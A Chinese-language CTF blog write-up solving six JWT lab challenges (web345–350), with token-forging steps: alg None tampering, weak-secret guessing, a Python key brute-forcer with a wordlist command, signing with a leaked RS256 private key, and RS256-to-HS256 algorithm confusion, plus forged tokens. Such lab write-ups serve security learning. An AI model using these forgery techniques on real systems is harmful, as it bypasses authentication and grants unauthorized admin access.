---
title: Web入门_jwt
author: Creexile
date: 2024-12-02 21:13:47
lastMod: 2025-04-10
summary: 'web345-350'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [JWT, 爆破, 代码审计, CTF]
---

# Web入门\_jwt

---

web345-350

## web345

- 描述: jwt开始啦

base解码cookie

```js
{"alg":"None","typ":"jwt"}?[{"iss":"admin","iat":1729655829,"exp":1729663029,"nbf":1729655829,"sub":"user","jti":"a665ee692b35c52bf4da124b7e06126b"}]
// 稍作修改
{"alg":"None","typ":"jwt"}?[{"iss":"admin","iat":1729655829,"exp":1729663029,"nbf":1729655829,"sub":"user","admin":"a665ee692b35c52bf4da124b7e06126b"}]
// eyJhbGciOiJOb25lIiwidHlwIjoiand0In0/W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3Mjk2NTU4MjksImV4cCI6MTcyOTY2MzAyOSwibmJmIjoxNzI5NjU1ODI5LCJzdWIiOiJ1c2VyIiwiYWRtaW4iOiJhNjY1ZWU2OTJiMzVjNTJiZjRkYTEyNGI3ZTA2MTI2YiJ9XQ==
```

手动写进cookie即可, 这边是直接在控制台的`Applocation`里面写的, hackerbar设置cookie也是正常的; 听说抓包的话还需要修改header才可以, 不是很懂

## web346

- 描述: 同上

解密网站: https://jwt.io/

jwt结构可以从这个网站里面看到: HMACSHA256( base64(头) + `.` + base(数据), 密钥); 这个网站可以直接在右侧修改字符串, 左侧会同时改变, 修改结果如下:

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241023123017.png)

你问为什么密钥是这个, 我只能说猜的

## web347

- 描述: jwt开始啦,弱口令

步骤完全同上, 密码都是一样的

可能本来的用意是写py脚本跑弱密码字典, 谁知道只是123456呢

## web348

- 描述: jwt开始啦,爆破

顾名思义, 应该是爆破密钥, 此时再用解密网站一个一个尝试在进度过于缓慢了, 这里我们用万能的py写个脚本, 但是你肯定得用到这个[pydictor-字典生成器](https://github.com/LandGrey/pydictor)

> 我寻思上一题没说纯数字, 这一题也没说纯字母啊

```shell
python .\pydictor.py -base L --len 1 4 -o key.txt
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241023194013.png)

将这个生成的字典放在下面这个代码的通一个文件夹下, 然后运行这个从官方那里扒拉下来的脚本:

```python
import jwt
import json

def runblasting(path, jwt_str ,alg):
    if alg == "none":
        alg = "HS256"
    with open(path, encoding='utf-8') as f:
        for line in f:
            key = line.strip()
            print('use ' + key)
            try:
                jwt.decode(jwt_str, verify=True, key=key, algorithms=alg)
                print('find key' + key)
                break
            except(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.ImmatureSignatureError):
                print('found key' + key)
                break
            except jwt.exceptions.InvalidSignatureError:
                continue

        else:
            print('key no found')

if __name__ == 'main':
    runblasting('key.txt', 'cookie的auth参数', 'HS256')
```

最后应该能爆出来密码为aaab, 回到之前那个网站改密钥即可

## web349

- 描述: 给了一个app.js文件

```js
/* GET home page. */
router.get('/', function (req, res, next) {
  res.type('html')
  var privateKey = fs.readFileSync(process.cwd() + '//public//private.key')
  var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' })
  res.cookie('auth', token)
  res.end('where is flag?')
})

router.post('/', function (req, res, next) {
  var flag = 'flag_here'
  res.type('html')
  var auth = req.cookies.auth
  var cert = fs.readFileSync(process.cwd() + '//public/public.key') // get public key
  jwt.verify(auth, cert, function (err, decoded) {
    if (decoded.user === 'admin') {
      res.end(flag)
    } else {
      res.end('you are not admin')
    }
  })
})
```

虽然用的是私钥, 但是该文件是可以下载下来的, 所以我们"可能"需要一个题目同款环境, 然后在源码中直接改为admin生成一个jwt即可

使用py脚本进行操作, 与私钥文件放在同目录下即可, 改cookie我就不写了

```python
import jwt

public = open('private.key', 'r').read()
payload={"user":"admin"}
print(jwt.encode(payload, key=public, algorithm='RS256'))
```

> 下面是失败案例, 我不想配环境啊

```bash
npx express-generator
# 似乎有npm就有, 反正你先试试有没有npx, 我是Ubuntu
# 用于快速生成一个基础的 Node.js Web 应用框架
```

将上面这个`app.js`的内容复制并替换进你生成的框架的`/routes/index.php`, 然后改一下user

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241023203458.png)

下载私钥, 访问`/private.key`即可下载, 将其放在你生成的框架目录的public文件夹下

然后就是安装依赖的时间了

```bash
npm start
# 测试, 这里没报错了再进网页看是否报错, 我到这里就没有报错了
npm install http-errors
npm install jsonwebtoken
# 直接输入jwt似乎不行
```

进入网页出现`fs is not defined`或者其他的, 是因为没有声明; 在`index.js`前面加上声明即可:

```js
var fs = require('fs')
var jwt = require('jsonwebtoken')
```

诶您才怎么着, 这些干完了给我整出来一个`secretOrPrivateKey has a minimum key size of 2048 bits for RS256`, 白瞎了

## web350

- 描述: 给了源码包

在给的源码中将公私钥都放进了`/route`目录下, 但是依然可以通过访问`/public.key`来下载公钥

> 我这里用python整不出来, 然后配置环境也配不出来, 委屈一下直接运行吧

```js
// yu22x师傅
const jwt = require('jsonwebtoken')
var fs = require('fs')
var privateKey = fs.readFileSync('public.key')
var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'HS256' })
console.log(token)
```

然后运行

```bash
node jwt.js
# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3Mjk3NTYzMzd9.ybFtdAxkeMIln0uDWfoIfwJa-fsP0tAwFmDlX_5pDcE
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241024155259.png)

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241024155437.png)
